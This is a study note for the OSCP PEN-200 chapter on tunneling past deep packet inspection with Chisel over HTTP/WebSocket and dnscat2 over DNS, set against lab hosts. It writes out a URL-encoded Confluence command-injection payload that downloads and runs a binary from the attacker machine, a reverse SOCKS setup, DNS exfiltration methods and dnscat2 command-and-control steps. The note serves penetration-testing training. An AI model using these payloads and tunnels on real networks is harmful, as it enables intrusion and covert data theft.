---
title: "PEN-200 Chapter 19 — Tunneling Through Deep Packet Inspection"
aliases:
  - "PEN-200 Ch 19"
  - "Tunneling Through DPI"
tags:
  - oscp
  - pen-200
  - pivoting
  - tunneling
  - chisel
  - dns-tunneling
  - dnscat2
  - deep-packet-inspection
chapter: 19
source: "PEN-200 — Tunneling Through Deep Packet Inspection"
status: "study-note"
---

# PEN-200 Chapter 19 — Tunneling Through Deep Packet Inspection

> [!summary] Chapter goal
> Learn how to pivot when ordinary SSH tunnels or reverse shells are blocked by network filtering or **Deep Packet Inspection (DPI)**. The chapter demonstrates two alternative transport mechanisms:
> 1. **HTTP tunneling with Chisel** — encapsulate pivot traffic inside HTTP/WebSocket traffic.
> 2. **DNS tunneling with dnscat2** — encode bidirectional traffic inside DNS queries and responses.

The chapter continues directly from the previous PEN-200 material on **Port Redirection and SSH Tunneling**. The central OSCP lesson is that a tunnel is only useful if its **transport protocol is allowed through the network controls**. If SSH is blocked, use another permitted protocol such as HTTP or DNS.

## Table of contents

- [[#19.1 HTTP Tunneling Theory and Practice]]
  - [[#19.1.1 HTTP Tunneling Fundamentals]]
  - [[#19.1.2 HTTP Tunneling with Chisel]]
- [[#19.2 DNS Tunneling Theory and Practice]]
  - [[#19.2.1 DNS Tunneling Fundamentals]]
  - [[#19.2.2 DNS Tunneling with dnscat2]]
- [[#19.3 Wrapping Up]]
- [[#Attack chain connection]]
- [[#Tools and concepts quick reference]]
- [[#OSCP mini cheat sheet]]

---

# Chapter overview: Deep Packet Inspection

**Deep Packet Inspection (DPI)** examines network traffic against rules and patterns instead of only looking at basic IP/port information. A restrictive perimeter device might, for example, terminate outbound traffic that actually uses the SSH protocol even if it is moved to another TCP port.

This matters because traditional SSH port forwarding still transports data with SSH. If DPI blocks SSH itself, changing the SSH port does not solve the problem.

The chapter therefore focuses on choosing a transport that the target is still allowed to use:

- HTTP/WebSocket traffic → **Chisel**
- DNS traffic → **dnscat2**

> [!important] OSCP mindset
> Before building a pivot, ask: **“What can this host actually communicate with, and using which protocol?”** Do not assume that an open outbound TCP port means your preferred tunneling protocol will survive inspection.

---

# 19.1 HTTP Tunneling Theory and Practice

Learning objectives:

- Understand HTTP tunneling.
- Perform HTTP tunneling with **Chisel**.

The chapter scenario assumes that **CONFLUENCE01** has already been compromised and commands can be executed through HTTP requests. The problem appears when attempting to pivot into the internal network.

---

## 19.1.1 HTTP Tunneling Fundamentals

### Scenario

The hypothetical perimeter restrictions are:

- Outbound traffic from CONFLUENCE01 is blocked **except HTTP**.
- Inbound ports on CONFLUENCE01 are blocked except **TCP/8090**.
- A normal reverse shell is unusable because its traffic does not look like HTTP.
- A normal SSH remote port forward is also unusable because DPI recognizes and blocks SSH.
- HTTP requests made with tools such as **Wget** and **cURL** are still allowed.

The goal is to reach **PGDATABASE01** through compromised **CONFLUENCE01**, while ensuring that traffic leaving CONFLUENCE01 resembles HTTP.

### Key concept

An HTTP tunnel wraps or carries another data stream inside HTTP-compatible traffic. The internal payload can be something completely different, but the network-facing transport is HTTP.

The chapter's solution is **Chisel**.

---

## 19.1.2 HTTP Tunneling with Chisel

### What Chisel does

**Chisel** is a cross-platform tunneling tool that:

- uses a **client/server** model;
- encapsulates traffic inside **HTTP/WebSocket** traffic;
- uses SSH internally for encryption;
- supports port-forwarding modes including reverse forwarding;
- can create a **reverse SOCKS proxy**;
- runs on Linux, macOS, and Windows across multiple architectures.

The chapter also mentions **HTTPTunnel** as an older tool with similar goals, but notes that Chisel is more flexible and cross-platform.

### Planned topology

The chapter places:

- **Chisel server** on the Kali attack machine.
- **Chisel client** on compromised CONFLUENCE01.
- A **SOCKS proxy** on Kali, listening by default on `127.0.0.1:1080`.

Traffic flow:

```text
Tool on Kali
    |
    v
127.0.0.1:1080 (SOCKS)
    |
    v
Chisel server on Kali :8080
    |
    | HTTP/WebSocket tunnel + encrypted Chisel transport
    v
Chisel client on CONFLUENCE01
    |
    v
Internal target (for example PGDATABASE01:22)
```

The important point is that the perimeter sees HTTP-formatted Chisel traffic rather than a direct SSH connection from CONFLUENCE01 to Kali.

---

### Step 1 — Copy the Chisel binary into Apache's web root

```bash
sudo cp $(which chisel) /var/www/html/
```

**Explanation**

- `sudo` — run the copy with elevated privileges because `/var/www/html/` is normally root-owned.
- `cp` — copy a file.
- `$(which chisel)` — command substitution; `which chisel` returns the installed Chisel binary path.
- `/var/www/html/` — Apache2's default web root on Kali in this example.

**When/why:** Use this when you need to make a local tool binary downloadable by a compromised Linux host over HTTP.

---

### Step 2 — Start Apache2

```bash
sudo systemctl start apache2
```

**Explanation**

- `systemctl` — manages systemd services.
- `start apache2` — starts the Apache2 web server.

**When/why:** Start a quick HTTP file server so the target can retrieve `chisel` through an allowed HTTP path.

---

### Step 3 — Download Chisel on CONFLUENCE01 and make it executable

```bash
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

**Arguments and operators**

- `wget 192.168.118.4/chisel` — retrieves `/chisel` from the attacker's HTTP server.
- `-O /tmp/chisel` — writes the response to `/tmp/chisel` rather than keeping the remote filename automatically.
- `&&` — run the second command only if the download succeeds.
- `chmod +x /tmp/chisel` — adds executable permission.

**When/why:** Use when outbound HTTP works but other transfer channels are filtered.

---

### Step 4 — Execute the download through the Confluence RCE

The chapter embeds the Wget command inside its URL-encoded Confluence command-injection payload:

```bash
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

**What matters here**

- `curl` sends the HTTP request to the vulnerable Confluence service on TCP/8090.
- The URL-encoded expression invokes Java/Nashorn/`ProcessBuilder` to execute a Bash command.
- The payload command downloads Chisel and gives it execute permission.

> [!tip]
> The chapter recommends modifying only the command-specific portion of a known-working URL-encoded RCE payload instead of rebuilding the entire encoded payload from scratch.

---

### Step 5 — Confirm that the target downloaded Chisel

```bash
tail -f /var/log/apache2/access.log
```

**Arguments**

- `tail` — prints the end of a file.
- `-f` — follows the file and prints new lines as they are appended.
- `/var/log/apache2/access.log` — Apache request log.

**When/why:** Verify that the target actually requested the hosted payload and troubleshoot failed file transfers.

A successful request should show a `GET /chisel` entry from the target.

---

### Step 6 — Start the Chisel server on Kali

```bash
chisel server --port 8080 --reverse
```

**Arguments**

- `server` — start Chisel in server mode.
- `--port 8080` — listen for the Chisel client on TCP/8080.
- `--reverse` — permit clients to request reverse port forwards. In this scenario it enables the client to create a reverse SOCKS listener on the server side.

**When/why:** Use on the attacker-controlled machine when the compromised host can make an outbound HTTP connection to you and you want the useful proxy/listener to appear locally on your attack machine.

Expected indicators include:

```text
Reverse tunnelling enabled
Listening on http://0.0.0.0:8080
```

---

### Step 7 — Observe Chisel traffic with tcpdump

```bash
sudo tcpdump -nvvvXi tun0 tcp port 8080
```

**Arguments**

- `sudo` — packet capture normally requires elevated privileges.
- `tcpdump` — packet capture/inspection tool.
- `-n` — do not resolve hostnames/services; keep numeric addresses/ports.
- `-vvv` — very verbose packet decoding.
- `-X` — print packet data in hex and ASCII.
- `-i tun0` — capture on Kali's `tun0` interface.
- `tcp port 8080` — BPF filter restricting capture to TCP/8080.

**When/why:** Validate the tunnel's network behavior and confirm that the Chisel connection looks like HTTP/WebSocket traffic.

The captured HTTP exchange contains headers similar to:

```http
GET / HTTP/1.1
Host: 192.168.118.4:8080
User-Agent: Go-http-client/1.1
Connection: Upgrade
Sec-WebSocket-Protocol: chisel-v3
Sec-WebSocket-Version: 13
Upgrade: websocket
```

This shows that the client upgrades an HTTP connection to a **WebSocket**, which is how Chisel carries the tunneled stream.

---

### Step 8 — Start the Chisel client on CONFLUENCE01

```bash
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```

**Arguments / shell syntax**

- `client` — run Chisel in client mode.
- `192.168.118.4:8080` — Chisel server address and port on Kali.
- `R:socks` — create a **reverse SOCKS** tunnel. The resulting SOCKS listener is on the Chisel server side and defaults to port `1080`.
- `> /dev/null` — discard standard output.
- `2>&1` — redirect standard error to the same destination as standard output.
- `&` — run the process in the background.

**When/why:** This is the core pivot command when the compromised host can reach the attacker through HTTP but direct SSH transport is blocked.

---

### Step 9 — Start the Chisel client through the Confluence injection

The chapter then executes the Chisel client through the URL-encoded Confluence RCE:

```bash
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

The logical command being executed on CONFLUENCE01 is:

```bash
/tmp/chisel client 192.168.118.4:8080 R:socks
```

---

### Step 10 — Verify the SOCKS listener

```bash
ss -ntplu
```

**Arguments**

- `ss` — inspect sockets.
- `-n` — numeric addresses/ports.
- `-t` — TCP sockets.
- `-p` — show owning process information where permitted.
- `-l` — listening sockets.
- `-u` — UDP sockets.

The important result is a Chisel listener on:

```text
127.0.0.1:1080
```

**When/why:** Always verify that the local SOCKS endpoint exists before troubleshooting tools that depend on it.

---

### Step 11 — Install Ncat for SSH ProxyCommand support

```bash
sudo apt install ncat
```

**Why Ncat?**

SSH has no generic `--socks-proxy` option. Instead, OpenSSH can launch another command through its **ProxyCommand** setting. The chapter notes that OpenBSD Netcat supports proxying, but Kali's default Netcat version in the lab does not provide the needed proxy feature. **Ncat**, maintained by the Nmap project, does.

---

### Step 12 — SSH through the Chisel SOCKS proxy

```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

**SSH arguments**

- `-o` — set an OpenSSH configuration option directly on the command line.
- `ProxyCommand='...'` — command SSH should use to establish the underlying connection.
- `database_admin@10.4.50.215` — SSH username and destination host.

**Ncat arguments inside ProxyCommand**

- `--proxy-type socks5` — use a SOCKS5 proxy.
- `--proxy 127.0.0.1:1080` — use the Chisel-created local SOCKS proxy.
- `%h` — OpenSSH substitutes the target host.
- `%p` — OpenSSH substitutes the target port.

**When/why:** Use this when SSH itself needs to traverse a SOCKS proxy and you do not want to rely on Proxychains.

### Result

The SSH session reaches the internal database server even though the pivot host's network controls only allow HTTP-formatted traffic toward Kali.

> [!important] Chisel mental model
> **Your local tool talks to SOCKS → Chisel server wraps the stream → HTTP/WebSocket crosses the perimeter → Chisel client unwraps it on the compromised pivot → traffic goes to the internal destination.**

---

# 19.2 DNS Tunneling Theory and Practice

Learning objectives:

- Understand DNS tunneling.
- Perform DNS tunneling with **dnscat2**.

DNS is often allowed even in highly restricted networks because normal hosts need name resolution. That makes DNS a possible transport for data when direct outbound connectivity is unavailable.

---

## 19.2.1 DNS Tunneling Fundamentals

### Normal DNS resolution flow

For a typical request such as `www.example.com`, a client usually asks a **recursive resolver** to resolve the name.

Simplified process:

1. Client asks the recursive resolver for an **A record**.
2. Resolver asks a **root name server** where the relevant TLD is handled.
3. Root server points to the `.com` **TLD name server**.
4. Resolver asks the TLD server which server is authoritative for `example.com`.
5. TLD server points to the **authoritative name server**.
6. Resolver asks the authoritative server for `www.example.com`.
7. Authoritative server returns the A record.
8. Recursive resolver returns the answer to the client.

The chapter uses standard DNS over **UDP/53** for the examples.

### DNS terms to know

- **Recursive resolver** — does the lookup work on behalf of the client.
- **Root name server** — points toward the appropriate TLD name server.
- **TLD name server** — knows authoritative servers for domains in a TLD such as `.com`.
- **Authoritative name server** — gives authoritative answers for a particular zone/domain.
- **A record** — contains an IPv4 address.
- **TXT record** — carries arbitrary string data.
- **CNAME record** — canonical-name alias record; dnscat2 can also use it as a carrier.
- **MX record** — mail exchanger record; dnscat2 can use it as another data carrier.

---

### Lab DNS topology

The chapter introduces **FELINEAUTHORITY** on the WAN. It is configured as the authoritative DNS server for the `feline.corp` zone.

Important connectivity constraint:

- PGDATABASE01 cannot directly reach FELINEAUTHORITY.
- PGDATABASE01 can reach MULTISERVER03.
- MULTISERVER03 is PGDATABASE01's recursive DNS resolver.
- MULTISERVER03 can reach FELINEAUTHORITY.

Therefore, a query such as:

```text
something.feline.corp
```

can originate on PGDATABASE01, be forwarded by MULTISERVER03, and eventually arrive at the attacker-controlled authoritative DNS server—even though PGDATABASE01 itself has no direct path to that server.

That is the fundamental opening DNS tunneling exploits.

---

### Dnsmasq setup on FELINEAUTHORITY

The chapter uses **Dnsmasq** to simulate an authoritative DNS server.

```bash
cd dns_tunneling
cat dnsmasq.conf
```

Configuration:

```ini
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
```

**Directive meanings**

- `no-resolv` — do not read `/etc/resolv.conf` for upstream resolvers.
- `no-hosts` — do not read `/etc/hosts` for local names.
- `auth-zone=feline.corp` — define `feline.corp` as an authoritative zone.
- `auth-server=feline.corp` — configure Dnsmasq as the authoritative server for that zone.

At this point there are no records, so requests under `feline.corp` will fail, but importantly they will still reach FELINEAUTHORITY.

---

### Start Dnsmasq in the foreground

```bash
sudo dnsmasq -C dnsmasq.conf -d
```

**Arguments**

- `-C dnsmasq.conf` — use the specified configuration file.
- `-d` — do not daemonize; remain in the foreground.

**When/why:** Foreground mode is convenient for a lab because output is visible and the process can be stopped easily with `Ctrl+C`.

---

### Capture DNS traffic on FELINEAUTHORITY

```bash
sudo tcpdump -i ens192 udp port 53
```

**Arguments**

- `-i ens192` — capture on interface `ens192`.
- `udp port 53` — only DNS-style UDP/53 traffic.

**When/why:** Confirm that DNS queries generated deep inside the internal network actually reach the authoritative server you control.

---

### Inspect PGDATABASE01's DNS configuration

```bash
resolvectl status
```

**Tool:** `resolvectl` interacts with `systemd-resolved`.

**When/why:** Identify which DNS resolver a compromised Linux host is using. This is critical before attempting DNS tunneling because the tunnel normally relies on the host's ordinary DNS resolution path.

The chapter shows MULTISERVER03 as the configured DNS server for PGDATABASE01.

---

### Generate an arbitrary DNS request

```bash
nslookup exfiltrated-data.feline.corp
```

**Purpose:** Cause PGDATABASE01 to request an attacker-controlled subdomain.

The expected result is `NXDOMAIN`, because no record was configured. The interesting part is not whether the query resolves: it is that the **label `exfiltrated-data` reaches the authoritative server**.

That proves a small amount of information can leave the internal network through DNS queries.

---

### systemd-resolved caching note

The chapter notes that Ubuntu may query the local stub resolver at `127.0.0.53`, which then forwards to the configured upstream DNS server.

If cached results interfere with testing:

```bash
resolvectl flush-caches
```

**When/why:** Clear local resolver caches so repeated DNS-tunneling experiments produce fresh upstream DNS requests.

The chapter also gives a direct-server `nslookup` example:

```bash
nslookup exfiltrated-data.feline.corp 192.168.50.64
```

> [!warning] Address inconsistency in the source
> The chapter's `resolvectl status` output shows the DNS server as `10.4.50.64`, while the direct `nslookup` example and later TXT-query output use `192.168.50.64`. Preserve the concept, but verify the correct resolver IP in your actual lab/exam network before copying the command.

---

### DNS exfiltration concept

A DNS query can carry attacker-controlled text in a subdomain:

```text
secret-data.feline.corp
```

For binary data, the chapter describes the concept of:

1. converting a binary file to a long hex string;
2. splitting the string into small chunks;
3. issuing sequential queries such as:

```text
[hex-chunk-1].feline.corp
[hex-chunk-2].feline.corp
[hex-chunk-3].feline.corp
```

4. logging those queries on the authoritative server;
5. reassembling and decoding the chunks back into the original data.

This is **exfiltration**: moving data from the restricted network outward.

---

### DNS infiltration concept with TXT records

To move data into the internal network, the authoritative server can return arbitrary string data in **TXT records**.

The chapter replaces the Dnsmasq configuration with:

```bash
cat dnsmasq_txt.conf
```

Configuration:

```ini
# Do not read /etc/resolv.conf or /etc/hosts
no-resolv
no-hosts

# Define the zone
auth-zone=feline.corp
auth-server=feline.corp

# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
```

Start Dnsmasq with the new file:

```bash
sudo dnsmasq -C dnsmasq_txt.conf -d
```

Query the TXT records from PGDATABASE01:

```bash
nslookup -type=txt www.feline.corp
```

**Argument**

- `-type=txt` — request TXT records rather than the default address lookup.

The client receives the arbitrary strings defined on FELINEAUTHORITY.

For binary transfer, the chapter suggests serving data as a sequence of **Base64** or **ASCII-hex** encoded TXT records, then decoding them on the internal host.

> [!important] Direction matters
> - **DNS query labels** can carry data **out** of the network.
> - **DNS responses** such as TXT records can carry data **into** the network.

---

## 19.2.2 DNS Tunneling with dnscat2

### What dnscat2 does

**dnscat2** automates the concepts from the previous section. It can:

- encode outbound data in DNS subdomain queries;
- return inbound data through DNS records;
- establish an encrypted command/control-style session;
- transfer files;
- execute commands;
- create TCP port forwards over DNS.

Architecture:

- **dnscat2 server** runs on the authoritative name server for a controlled domain.
- **dnscat client** runs on the compromised internal host.
- Ordinary DNS infrastructure relays requests between the client and authoritative server.

The chapter emphasizes that DNS tunneling is not an initial exploitation technique by itself. You first need code execution or another method to get the client onto the compromised host.

---

### Step 1 — Monitor UDP/53

```bash
sudo tcpdump -i ens192 udp port 53
```

Same purpose as before: observe the DNS traffic generated by dnscat2.

---

### Step 2 — Stop Dnsmasq and start the dnscat2 server

Stop the foreground Dnsmasq process with:

```text
Ctrl+C
```

Then run:

```bash
dnscat2-server feline.corp
```

**Argument**

- `feline.corp` — domain/zone that the dnscat2 server will handle.

The server listens on `0.0.0.0:53` and prints a suggested client command containing a generated secret.

Example printed by the chapter:

```bash
./dnscat --secret=c6cbfa40606776bf86bf439e5eb5b8e7 feline.corp
```

It also shows the direct-server mode:

```bash
./dnscat --dns server=x.x.x.x,port=53 --secret=c6cbfa40606776bf86bf439e5eb5b8e7
```

**Arguments**

- `--secret=<value>` — pre-shared secret used to authenticate/validate the encrypted session. The chapter marks it optional, but using it avoids relying only on manual verification.
- `feline.corp` — use normal DNS resolution for that domain.
- `--dns server=x.x.x.x,port=53` — send DNS traffic directly to a specified DNS server instead of using an authoritative-domain resolution path.

**When/why:**

- Domain mode is useful when only normal recursive DNS resolution is available.
- Direct `--dns` mode is useful when the compromised host can directly send UDP/53 to the dnscat2 server.

> [!note]
> The actual secret is generated per server run. Do not memorize the sample value.

---

### Step 3 — Run the dnscat2 client on PGDATABASE01

The chapter changes into the client directory:

```bash
cd dnscat/
```

Then starts the client using the domain:

```bash
./dnscat feline.corp
```

The client reports its DNS driver configuration, including:

```text
domain = feline.corp
port = 53
type = TXT,CNAME,MX
server = 127.0.0.53
```

This shows that dnscat2 can vary its carrier record types and send queries through the local system resolver.

The chapter notes that if the client binary were not already on the target, it could have been transferred through the existing SSH access using **SCP**.

---

### Session validation

Without a pre-shared `--secret`, dnscat2 prints a human-readable authentication string on both sides, for example:

```text
Annoy Mona Spiced Outran Stump Visas
```

Compare the strings on server and client. Matching strings indicate that the encrypted connection was not modified by an inline attacker.

The string changes for every new connection.

---

### DNS traffic characteristics

`tcpdump` shows many queries and responses involving:

- `TXT`
- `CNAME`
- `MX`

The labels and responses contain encoded/encrypted data.

> [!warning] Operational trade-off
> The chapter explicitly points out that dnscat2 DNS tunneling is **not stealthy**. It generates a large amount of unusual DNS traffic, even though the contents are encrypted.

Stop `tcpdump` when finished:

```text
Ctrl+C
```

---

### Step 4 — List dnscat2 windows

At the dnscat2 server prompt:

```text
dnscat2> windows
```

The output includes windows such as:

```text
0 :: main [active]
crypto-debug :: Debug window for crypto stuff
dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp
1 :: command (pgdatabase01) [encrypted, NOT verified]
```

**When/why:** Use `windows` to identify active client sessions and the window ID assigned to the target.

---

### Step 5 — Interact with a specific client window

```text
dnscat2> window -i 1
```

**Argument**

- `-i 1` — interact with window/session ID `1`.

Use this after `windows` reveals the correct session ID.

---

### Step 6 — List commands in the dnscat2 client session

```text
command (pgdatabase01) 1> ?
```

The chapter shows these available commands:

```text
clear
delay
download
echo
exec
help
listen
ping
quit
set
shell
shutdown
suspend
tunnels
unset
upload
window
windows
```

### What these commands are for

| dnscat2 command | Practical meaning |
|---|---|
| `clear` | Clear the current session display/history view. |
| `delay` | Adjust client communication timing/delay behavior. |
| `download` | Download a file from the remote/client side through the DNS channel. |
| `echo` | Echo text; useful for simple interaction/testing. |
| `exec` | Execute a command on the client. |
| `help` | Display help. |
| `listen` | Create a local listening port and forward connections through the dnscat2 client. This is the important tunneling command in this chapter. |
| `ping` | Test responsiveness of the dnscat2 session. |
| `quit` | Exit/close the relevant interactive context. |
| `set` | Set a dnscat2 option/value. |
| `shell` | Open a shell-style session on the client. |
| `shutdown` | Shut down a client/session. |
| `suspend` | Suspend the current session/window. |
| `tunnels` | Display/manage tunnel information. |
| `unset` | Remove a previously set option/value. |
| `upload` | Upload a file to the client over the DNS channel. |
| `window` | Switch/interact with a window. |
| `windows` | List available windows/sessions. |

> [!note]
> The chapter only demonstrates detailed syntax for `listen`; use each command's `-h`/`--help` output when you need exact syntax for the others.

---

### Step 7 — Inspect `listen` help

The chapter backgrounds the console interaction with:

```text
Ctrl+Z
```

Then requests help:

```text
command (pgdatabase01) 1> listen --help
```

The important syntax is:

```text
listen [<lhost>:]<lport> <rhost>:<rport>
```

The chapter compares this directly to SSH local port forwarding (`ssh -L`).

**Meaning**

- `<lhost>` — local interface on the dnscat2 server where the listener binds.
- `<lport>` — local listening port.
- `<rhost>` — destination reachable from the dnscat2 client.
- `<rport>` — destination port.

Traffic sent to the server-side listener enters the DNS tunnel, exits through the compromised client, and is delivered to the internal destination.

---

### Step 8 — Forward a local port to HRSHARES SMB

```text
command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
```

**Arguments**

- `127.0.0.1:4455` — create a listener on FELINEAUTHORITY's loopback interface, TCP/4455.
- `172.16.2.11:445` — send connections through PGDATABASE01 to HRSHARES TCP/445 (SMB).

Logical flow:

```text
FELINEAUTHORITY 127.0.0.1:4455
          |
          v
       dnscat2
          |
          | DNS tunnel
          v
PGDATABASE01 dnscat client
          |
          v
HRSHARES 172.16.2.11:445
```

**When/why:** Use when an internal service is reachable from the compromised dnscat2 client but not from your external server.

---

### Step 9 — Reach SMB through the DNS tunnel

The chapter lists SMB shares through the local forwarded port:

```bash
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```

> [!note]
> In the PDF the `--password=Welcome1234` option is line-wrapped across two displayed lines; it represents one smbclient option.

**Arguments**

- `smbclient` — command-line SMB/CIFS client.
- `-p 4455` — connect to TCP/4455 instead of the normal SMB port.
- `-L //127.0.0.1` — list shares on the server reached at the local endpoint.
- `-U hr_admin` — authenticate as `hr_admin`.
- `--password=Welcome1234` — provide the password non-interactively as shown in the chapter.

The local connection is forwarded through dnscat2 to HRSHARES:445. The chapter successfully lists shares including `ADMIN$`, `C$`, `IPC$`, `scripts`, and `Users`.

The transport is slower than a direct SMB connection because TCP-based SMB data is being encapsulated into DNS request/response traffic, which itself is carried over UDP/53.

> [!important] dnscat2 mental model
> **Local TCP connection on your controlled DNS server → dnscat2 converts the stream into DNS traffic → normal DNS infrastructure relays it → dnscat client reconstructs the stream → internal destination receives ordinary TCP traffic.**

---

# 19.3 Wrapping Up

The chapter demonstrates two alternatives for tunneling through restrictive network controls:

| Technique | Transport visible to the network | Main tool | Best fit | Trade-offs |
|---|---|---|---|---|
| HTTP tunneling | HTTP/WebSocket over TCP | Chisel | Outbound HTTP is allowed; need flexible SOCKS/port forwarding | Requires a usable HTTP path to the server; may still be detectable by traffic inspection/behavior. |
| DNS tunneling | DNS queries/responses over UDP/53 | dnscat2 | Direct outbound connectivity is restricted but DNS resolution works | Slow and very noisy; requires authoritative-domain control or direct DNS reachability. |

The main lesson is not “always use Chisel” or “always use dnscat2.” It is to **adapt the tunnel transport to the protocols the network permits**.

---

# Attack chain connection

```text
Recon → Enumeration → Initial Access → Privilege Escalation → Credentials → Pivoting → AD → Proof
```

This chapter is primarily a **Pivoting** chapter, but it connects to nearly every stage around it.

## Recon

Goal: learn enough about the environment to know which communication paths may exist.

Relevant questions:

- Can the compromised host reach the Internet/WAN?
- Which ports appear usable?
- Does DNS resolution work?
- Is HTTP allowed while arbitrary TCP protocols are blocked?

The chapter assumes the attacker's network knowledge is already developing from earlier compromise activity.

## Enumeration

This chapter adds **egress and transport enumeration** to normal service enumeration.

Useful checks demonstrated or implied:

- Verify DNS resolver configuration with `resolvectl status`.
- Generate test DNS lookups with `nslookup`.
- Observe listeners with `ss -ntplu`.
- Observe actual traffic with `tcpdump`.
- Confirm file-transfer requests in Apache logs.

The key enumeration question becomes: **Which protocol survives the network path?**

## Initial Access

HTTP/DNS tunneling does not replace initial exploitation. The chapter begins after a host such as CONFLUENCE01 is already compromised.

For dnscat2 specifically, the chapter explicitly notes the “chicken or egg” issue: you need an exploitation vector or some form of command execution before you can run the tunneling client.

## Privilege Escalation

Privilege escalation is not the chapter's focus. However, higher privileges can help when:

- binding privileged ports;
- installing tools;
- capturing packets;
- accessing credentials or internal services needed for the next pivot.

Do not confuse **better network reachability** with **higher local privileges**; they solve different problems.

## Credentials

The chapter uses already-obtained credentials to capitalize on the tunnel:

- SSH credentials for `database_admin` are used after Chisel exposes an internal route.
- SMB credentials for `hr_admin` are used after dnscat2 exposes HRSHARES SMB.

This illustrates a common OSCP pattern:

```text
Find credentials → build a route → reuse credentials against a previously unreachable host/service
```

## Pivoting — core of the chapter

This is where Chapter 19 fits most strongly.

### HTTP/Chisel path

```text
Kali SOCKS :1080
    ↓
Chisel server :8080
    ↓ HTTP/WebSocket
CONFLUENCE01 Chisel client
    ↓
PGDATABASE01 SSH
```

Use when SSH/reverse-shell traffic is blocked but HTTP is allowed.

### DNS/dnscat2 path

```text
FELINEAUTHORITY local TCP listener
    ↓
dnscat2 server
    ↓ DNS queries/responses
Recursive resolver(s)
    ↓
PGDATABASE01 dnscat client
    ↓
HRSHARES / other internal service
```

Use when ordinary outbound connectivity is absent but DNS queries can reach an attacker-controlled authoritative domain.

## AD

The chapter does not directly perform Active Directory attacks, but the tunneling techniques are highly relevant once AD services are isolated on internal networks.

A tunnel may let you reach otherwise inaccessible services such as:

- SMB (`445`)
- LDAP/LDAPS (`389`/`636`)
- Kerberos (`88`)
- WinRM (`5985`/`5986`)
- MSSQL (`1433`)
- RDP (`3389`)

The OSCP connection is: **after establishing a pivot, continue normal AD enumeration/credential reuse through the tunnel.**

## Proof

A tunnel itself is not the final objective. Use it to produce evidence of meaningful access.

Examples from the chapter:

- successful SSH login to an internal database host through Chisel;
- successful SMB share listing on HRSHARES through dnscat2.

For an exam machine, continue from the tunnel to the required objective and capture the required proof according to exam rules.

---

# Tools and concepts quick reference

| Tool / feature | Role in this chapter | When to use |
|---|---|---|
| **Chisel** | HTTP/WebSocket tunneling, SOCKS and port forwarding | HTTP egress works but direct tunneling protocols such as SSH are filtered. |
| **HTTPTunnel** | Older HTTP tunneling alternative mentioned by the chapter | Historical/alternative option; Chisel is preferred in the chapter. |
| **Apache2** | Hosts the Chisel binary for download | Target can make outbound HTTP requests to Kali. |
| **Wget** | Downloads payload/tool to target | Simple HTTP file transfer from Linux. |
| **cURL** | Sends the Confluence exploit/RCE request | Need controlled HTTP requests or to trigger a web-based command execution vector. |
| **tail** | Monitors Apache logs | Confirm a target requested your payload. |
| **tcpdump** | Packet capture | Validate tunnel establishment and understand transport behavior. |
| **ss** | Socket inspection | Verify local proxy/listener ports such as Chisel's 1080. |
| **SSH ProxyCommand** | Lets SSH establish its TCP stream through another command | SSH must pass through a SOCKS proxy. |
| **Ncat** | SOCKS-aware connection helper for ProxyCommand | Native Kali Netcat lacks the proxy capability needed in the chapter. |
| **Proxychains** | Mentioned from the previous module as a way to force non-SOCKS-aware tools through SOCKS | General tool proxying; not the primary SSH method demonstrated here. |
| **Dnsmasq** | Minimal authoritative DNS server for the lab | Demonstrate DNS query routing and TXT-record data transfer. |
| **resolvectl** | Inspect/flush `systemd-resolved` state | Determine target DNS configuration and clear caches. |
| **nslookup** | Generate DNS queries and request specific record types | Test whether attacker-controlled domains/records are reachable. |
| **dnscat2-server** | Server side of DNS tunnel | Run on authoritative DNS server or directly reachable DNS endpoint. |
| **dnscat** | Client side of DNS tunnel | Run on compromised internal host to create DNS-based session/tunnels. |
| **SCP** | Mentioned as a possible way to transfer dnscat client binary | Existing SSH access already exists and you need to stage the tunnel client. |
| **smbclient** | Tests SMB connectivity through the dnscat2 local port forward | Validate access to internal SMB shares through the tunnel. |

---

# Common failure points / troubleshooting

> [!failure] Chisel client never connects
> Check that Kali's Chisel server is listening, the selected TCP port is reachable over the allowed HTTP path, and the target has the correct Kali IP/port. Use `tcpdump` and Apache logs to distinguish transfer problems from tunnel problems.

> [!failure] SOCKS port 1080 is missing
> Confirm the server was started with `--reverse` and the client requested `R:socks`. Verify with `ss -ntplu`.

> [!failure] SSH does not traverse SOCKS
> Ensure the `ProxyCommand` uses **Ncat** with `--proxy-type socks5 --proxy 127.0.0.1:1080`, and retain `%h %p` so SSH substitutes its actual destination.

> [!failure] DNS query does not reach your authoritative server
> Check the target's resolver (`resolvectl status`), confirm the domain/zone is delegated correctly in a real environment, verify UDP/53 traffic, and watch `tcpdump` on the authoritative server.

> [!failure] Repeated DNS tests give old answers
> Try `resolvectl flush-caches` before retesting.

> [!failure] dnscat2 connects but is painfully slow
> That is expected compared with direct TCP. The stream is being transformed into many DNS requests/responses.

> [!failure] dnscat2 is easy to spot
> Also expected. The chapter explicitly shows large volumes of TXT/CNAME/MX queries. Treat DNS tunneling as a constrained-network technique, not inherently stealthy traffic.

---

# OSCP mini cheat sheet

> [!tip] Keep beside you while solving a machine

```bash
# 1. Stage Chisel through Apache
sudo cp $(which chisel) /var/www/html/
sudo systemctl start apache2

